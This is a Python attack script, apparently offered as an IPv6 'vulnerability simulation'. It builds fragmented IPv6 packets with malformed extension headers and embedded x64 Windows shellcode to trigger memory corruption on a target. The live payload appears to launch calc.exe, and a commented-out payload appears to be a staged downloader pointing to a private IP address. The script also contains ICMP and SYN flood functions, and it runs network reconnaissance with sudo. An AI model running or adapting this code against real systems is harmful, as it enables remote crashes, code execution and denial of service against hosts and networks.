



print(f'''

\033[1;34m                                                                              ,----,                                  ,--,                 

                                     ,----..                                ,/   .`|     ,----..        ,----..    ,---.'|                 

            ,---,.    .--.--.       /   /   \       ,---,                 ,`   .'  :    /   /   \      /   /   \   |   | :      .--.--.    

          ,'  .'  \  /  /    '.    /   .     :    .'  .' `\             ;    ;     /   /   .     :    /   .     :  :   : |     /  /    '.  

        ,---.' .' | |  :  /`. /   .   /   ;.  \ ,---.'     \          .'___,/    ,'   .   /   ;.  \  .   /   ;.  \ |   ' :    |  :  /`. /  

        |   |  |: | ;  |  |--`   .   ;   /  ` ; |   |  .`\  |         |    :     |   .   ;   /  ` ; .   ;   /  ` ; ;   ; '    ;  |  |--`   

        :   :  :  / |  :  ;_     ;   |  ; \ ; | :   : |  '  |         ;    |.';  ;   ;   |  ; \ ; | ;   |  ; \ ; | '   | |__  |  :  ;_     

        :   |    ;   \  \    `.  |   :  | ; | ' |   ' '  ;  :         `----'  |  |   |   :  | ; | ' |   :  | ; | ' |   | :.'|  \  \    `.        v.1

        |   :     \   `----.   \ .   |  ' ' ' : '   | ;  .  |             '   :  ;   .   |  ' ' ' : .   |  ' ' ' : '   :    ;   `----.   \ 

        |   |   . |   __ \  \  | '   ;  \; /  | |   | :  |  '             |   |  '   '   ;  \; /  | '   ;  \; /  | |   |  ./    __ \  \  | 

        '   :  '; |  /  /`--'  /  \   \  ',  /  '   : | /  ;              '   :  |    \   \  ',  /   \   \  ',  /  ;   : ;     /  /`--'  / 

        |   |  | ;  '--'.     /    ;   :    /   |   | '` ,/               ;   |.'      ;   :    /     ;   :    /   |   ,/     '--'.     /  

        |   :   /     `--'---'      \   \ .'    ;   :  .'                 '---'         \   \ .'       \   \ .'    '---'        `--'---'   

        |   | ,'                     `---`      |   ,.'                                  `---`          `---`                              

        `----'                                  '---'                                                                                      



    Developed by https://github.com/ThemeHackers

    Developed by https://www.instagram.com/_theme.ifning/

                                                                                                                                           

\033[0m''')





import argparse

import subprocess

import sys

import pkg_resources

from scapy.all import *

import time

import os



def install_package(package):

    """Install a package using pip."""

    subprocess.check_call([sys.executable, "-m", "pip", "install", package])



required_packages = ['scapy', 'psutil']

installed_packages = [pkg.key for pkg in pkg_resources.working_set]



# Ensure required packages are installed

for package in required_packages:

    if package not in installed_packages:

        print(f"{package} not found. Installing...")

        install_package(package)

    else:

        print(f"{package} is already installed.")



def install_v6disc():

    """Clone the v6disc repository if not already cloned."""

    repo_url = "https://github.com/cvmiller/v6disc"

    clone_dir = "v6disc"



    if not os.path.exists(clone_dir):
        print("Cloning v6disc repository...")
        os.system(f"git clone {repo_url}")
    else:
        print("v6disc is already cloned.")


install_v6disc()

# Command-line arguments
parser = argparse.ArgumentParser(description="IPv6 Vulnerability Simulation Script by HackerTheme.")
parser.add_argument("--iface", type=str, required=True, help="Network interface(s) to use for sending packets, comma-separated for multiple.")
parser.add_argument("--ipv6", type=str, help="Destination IP address (optional).")
parser.add_argument("--mac_addr", type=str, default='', help="Destination MAC address (optional).")
parser.add_argument("--num_tries", type=int, default=30, help="Number of tries per batch.")
parser.add_argument("--num_batches", type=int, default=30, help="Number of batches of tries.")
args = parser.parse_args()
ifaces = args.iface.split(',')
ipv6 = args.ipv6
print(ipv6)
mac_addr = args.mac_addr
num_tries = args.num_tries
num_batches = args.num_batches
# Color codes for output
RESET = '\033[0m'
RED = '\033[91m'
MAGENTA = '\033[95m'
GREEN = '\033[92m'
WHITE = '\033[97m'
BLUE = '\033[94m'
BOLD = '\033[1m'

# Shellcode payload
#shellcode = ("\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x50\x00\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x62\x46\x61\x54\x00\xcd\x07\xc1\x60\x9c\x85\x79\xa9\x81\xbb\xc8\x36\xea\x10\x52\xc2\x2c\xe5\x69\xa2\x49\xe4\xec\x90\x03\x3e\xe0\xcd\x39\x6a\xcc\xac\x3b\x8b\x73\x75\x94\x39\xda\x62\x8c\xb2\x1d\xd2\xb4\x4f\x8b\x2e\x7d\x6a\x2c\xd0\xb4\xd7\xbe\x9a\x8b\x6f\x89\xda\x7a\x82\xad\x31\x3b\x87\x31\x83\xf1\x1d\x32\x33\x2d\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x2c\x20\x4d\x53\x49\x45\x20\x31\x31\x2c\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x33\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x37\x2e\x30\x3b\x20\x72\x76\x3a\x31\x31\x2e\x30\x29\x20\x6c\x69\x6b\x65\x20\x47\x65\x63\x6b\x6f\x0d\x0a\x00\xb0\x1a\xd4\x53\x0e\xb1\xc4\xe6\x25\xd0\x56\x83\x31\xdf\xa1\x0f\x88\x49\x1a\xc4\x7d\x47\x0b\xbb\x9d\x2d\xf0\xc5\xca\x9f\xc6\xd2\xd6\x97\x35\xac\xb5\xb8\xfc\xe9\x0f\x31\xf8\x87\xa0\xeb\x98\x37\x85\xe1\x8d\x02\x0f\xd0\x84\x77\x5b\x3a\x22\x32\x31\xea\x28\x1e\x4f\xa4\xef\xd6\x1c\xc0\xfa\x45\xbf\xe8\xc0\xa2\x3e\x9c\x9a\xb5\x94\xe4\x7f\x57\xc8\x44\x9f\x16\x11\xce\xcd\x77\x77\xc0\x19\x83\x09\x79\x12\x23\xc5\x3d\x5c\x11\x0a\x05\x2c\xc6\xd3\xae\xbd\x10\x6c\xed\x29\x39\xef\x64\xba\xfc\xe0\x36\xde\xda\x76\x91\x72\xcb\x8f\x66\xba\x94\xfe\x58\x03\x22\x6f\xd4\xfa\x63\xed\x22\xc8\x71\x8a\xfc\xa3\x86\xf9\x6e\x47\xe5\xfd\x4e\x3a\xe1\xd1\x8f\x10\xbc\x31\xb9\xc1\x2b\xee\x4f\x78\xb2\xaf\x94\x4a\x9d\x6e\x79\x74\x6a\xf6\xe0\x5d\xb3\x2f\x82\x09\x1a\xe5\x26\xf3\x0f\x23\xe4\xa3\x9f\x76\xf6\x88\xbf\xd8\x33\x15\xf9\xcd\x36\x72\xdc\x6b\xc7\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x34\x30\x2e\x31\x33\x30\x00\x3a\xde\x68\xb1")
shellcode = ("\x48\x81\xEC\x00\x01\x00\x00\x65\x48\x8B\x04\x25\x60\x00\x00\x00\x48\x8B\x40\x18\x48\x8B\x40\x30\x48\x8B\x70\x10\x48\x8B\x58\x40\x48\x8B\x00\x81\x7B\x0C\x33\x00\x32\x00\x75\xEC\x48\x8B\xCE\x48\xC7\xC2\x32\x74\x91\x0C\xE8\xC0\x00\x00\x00\x4C\x8B\xF0\x48\xC7\xC3\x6C\x6C\x00\x00\x53\x48\xBB\x75\x73\x65\x72\x33\x32\x2E\x64\x53\x48\x8B\xCC\x48\x83\xEC\x18\x41\xFF\xD6\x48\x8B\xD8\x48\x8B\xCB\x48\xC7\xC2\x6A\x0A\x38\x1E\xE8\x8E\x00\x00\x00\x4C\x8B\xF0\x4D\x33\xC9\x4D\x33\xC0\x48\x33\xD2\x48\x33\xC9\x41\xFF\xD6\x48\x8B\xCE\x48\xC7\xC2\x51\x2F\xA2\x01\xE8\x6D\x00\x00\x00\x4C\x8B\xF0\x48\x33\xC0\x50\x48\xB8\x63\x61\x6C\x63\x2E\x65\x78\x65\x50\x48\x8B\xCC\x48\x83\xEC\x20\x48\xC7\xC2\x01\x00\x00\x00\x41\xFF\xD6\x48\x8B\xCE\x48\xBA\x85\xDF\xAF\xBB\x00\x00\x00\x00\xE8\x38\x00\x00\x00\x4C\x8B\xF0\x48\xC7\xC0\x61\x64\x00\x00\x50\x48\xB8\x45\x78\x69\x74\x54\x68\x72\x65\x50\x48\x8B\xCE\x48\x8B\xD4\x48\x83\xEC\x20\x41\xFF\xD6\x4C\x8B\xF0\x48\x81\xC4\x88\x01\x00\x00\x48\x83\xEC\x18\x48\x33\xC9\x41\xFF\xD6\xC3\x48\x83\xEC\x40\x56\x48\x8B\xFA\x48\x8B\xD9\x48\x8B\x73\x3C\x48\x8B\xC6\x48\xC1\xE0\x36\x48\xC1\xE8\x36\x48\x8B\xB4\x03\x88\x00\x00\x00\x48\xC1\xE6\x20\x48\xC1\xEE\x20\x48\x03\xF3\x56\x8B\x76\x20\x48\x03\xF3\x48\x33\xC9\xFF\xC9\xFF\xC1\xAD\x48\x03\xC3\x33\xD2\x80\x38\x00\x74\x0F\xC1\xCA\x07\x51\x0F\xBE\x08\x03\xD1\x59\x48\xFF\xC0\xEB\xEC\x3B\xD7\x75\xE0\x5E\x8B\x56\x24\x48\x03\xD3\x0F\xBF\x0C\x4A\x8B\x56\x1C\x48\x03\xD3\x8B\x04\x8A\x48\x03\xC3\x5E\x48\x83\xC4\x40\xC3")
def get_packets_with_mac(i):
    """Generate packets with a specified MAC address."""
    frag_id = 0xdebac1e + i
    first = Ether(dst=mac_addr) / IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrDestOpt(options=[PadN(otype=0x81, optdata='a'*3)])
    second = Ether(dst=mac_addr) / IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrFragment(id=frag_id, m=1, offset=0) / shellcode
    third = Ether(dst=mac_addr) / IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrFragment(id=frag_id, m=0, offset=1)
    return [first, second, third]
def get_packets(i):
    """Generate packets without a MAC address."""
    #print('@enter get_packets')
    if mac_addr != '':
        return get_packets_with_mac(i)
    frag_id = 0xdebac1e + i
    first = IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrDestOpt(options=[PadN(otype=0x81, optdata='a'*3)])
    second = IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrFragment(id=frag_id, m=1, offset=0) / shellcode
    third = IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrFragment(id=frag_id, m=0, offset=1)
    return [first, second, third]

def get_exploit_packet(i):
    """Generate exploit packets."""
    if mac_addr != '':
        #print('@@skip')
        return get_packets(i)
    frag_id = 0xdebac1e + i
    first = Ether(dst=ipv6) / IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrDestOpt(options=[PadN(otype=0x81, optdata='a'*3)])
    second = IPv6(hlim=64+i, dst=ipv6) / IPv6ExtHdrFragment(id=frag_id, m=1, offset=0) / shellcode
    print(shellcode)
    third = Ether(dst=ipv6) / IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrFragment(id=frag_id, m=0, offset=1)
    return [first, second, third]
# ICMP flood attack
def icmp_flood_attack(ipv6):
    """Perform ICMP flood attack with head and tail sends."""
    print(f"{RED}Starting ICMP flood attack on {ipv6}...{RESET}")
    number_of_deliveries = int(input("Enter the number of shipments ICMP flood attack: "))
    send(IPv6(dst=ipv6) / ICMP() / "Flood Start!", count=1)
    for _ in range(number_of_deliveries):
        send(IPv6(dst=ipv6) / ICMP() / "Flood!", count=1000)
    send(IPv6(dst=ipv6) / ICMP() / "Flood End!", count=1)
# SYN flood attack
def syn_flood_attack(i, ipv6):
    """Perform SYN flood attack with head and tail sends."""
    print(f"{RED}Starting SYN flood attack on {ipv6}...{RESET}") 
    frag_id = 0xdebac1e + i 
    number_of_deliveries = int(input("Enter the number of shipments SYN flood attack: "))
    send(IPv6(dst=ipv6) / IPv6ExtHdrFragment(id=frag_id, m=1, offset=0) / TCP(sport=RandShort(), dport=80, flags="S"), count=1)
    for i in range(number_of_deliveries):
        frag_id = 0xdebac1e + i 
        send(IPv6(hlim=64 + i, dst=ipv6) / IPv6ExtHdrFragment(id=frag_id, m=1, offset=0) / TCP(sport=RandShort(), dport=80, flags="S"), count=1000)
    send(IPv6(dst=ipv6) / IPv6ExtHdrFragment(id=frag_id + 1, m=1, offset=0) / TCP(sport=RandShort(), dport=80, flags="S"), count=1)
# Select type of flood attack
def prompt_select_attack(ipv6):
    """Prompt user to select attack type."""
    print("\nSelect an attack type:")
    print("[1] ICMP Flood Attack")
    print("[2] SYN Flood Attack")
    print("[3] Skip Attack")
    choice = input("Your choice: ")
    if choice == '1':
        icmp_flood_attack(ipv6)
    elif choice == '2':
        syn_flood_attack(i, ipv6)
    else:
        print("Skipping flood attack.")
def prompt_run_v6disc():
    """Prompt user to run v6disc.sh."""
    print("\n" + "="*80)
    print("               v6disc.sh - IPv6 Discovery Script")
    print("          Developed by https://github.com/cvmiller/v6disc")
    print("="*80 + "\n")
    print("v6disc.sh is a script that typically performs IPv6 discovery operations,")
    print("such as sending ICMPv6 Neighbor Solicitation messages to identify")
    print("IPv6-enabled devices on a network. It may also be used for network")
    print("reconnaissance or as a part of penetration testing processes.\n")
    print("Please select an option:")
    print("  [y] Run v6disc.sh Advanced scan")
    print("  [o] Run v6disc.sh General scan")
    print("  [s] Skipping v6disc.sh...")
    print("  [n] exit\n")
    run_script = input("Your choice (y/o/s/n): ").lower()
    if run_script == 'y':
        print("\nRunning v6disc.sh Advanced scan...\n")
        os.system('sudo bash v6disc/v6disc.sh -i eth0 -L -D -N -n')
    elif run_script == 'o':
        print("\nRunning v6disc.sh General scan...\n")
        os.system('sudo bash v6disc/v6disc.sh -L')
    elif run_script == 's':
        print("\nSkipping v6disc.sh...\n")
        return ipv6
    else:
        print("\nSkipping v6disc.sh...\n")
        print("Exiting...\n")
        sys.exit()
def prompt_send_dangerous_packets():
    """Prompt user to send dangerous packets."""
    run_packets = input("Do you want to send a dangerous package? (y/n): ").lower()
    if run_packets == 'y':
        print(f'{GREEN}Sending packets...{RESET}')
        for iface in ifaces:
            sendp(final_ps, iface=iface) if mac_addr else send(final_ps, iface=iface)
    elif run_packets == 'n':
        print("Exiting program...")
        sys.exit()  
    else:
        print("Invalid input. Skipping packet sending...")
if not ipv6:
    print("Scanning network for available IPv6 addresses...")
    prompt_run_v6disc()
    time.sleep(1)
    ipv6 = input("No IPv6 address provided. Please enter the IPv6 address you want to use: ")
    mac_addr = input("Enter mac addr when auto-find is not possible: ")
else: 
    use_ipv6 = input(f"Do you want to use the provided IPv6 address {ipv6}? (y/n): ").lower()
    if use_ipv6 == 'n':
        ipv6 = input("Please enter the new IPv6 address (Can be left blank): ")
    elif use_ipv6 != 'y':
        print("Invalid input. Exiting...")
        sys.exit()
final_ps = []
for _ in range(num_batches):
    for i in range(num_tries):
        final_ps += get_packets(i) + get_exploit_packet(i) + get_packets(i)
if ipv6:
    prompt_select_attack(ipv6)
    prompt_send_dangerous_packets()
else:
    prompt_run_v6disc()
    prompt_select_attack(ipv6)
    prompt_send_dangerous_packets()
for i in range(60):
    print(f"{MAGENTA}Memory corruption will be triggered in {60-i} seconds{RESET}", end='\r')
    time.sleep(1)
print("\nScanning and monitoring completed. Exiting...")

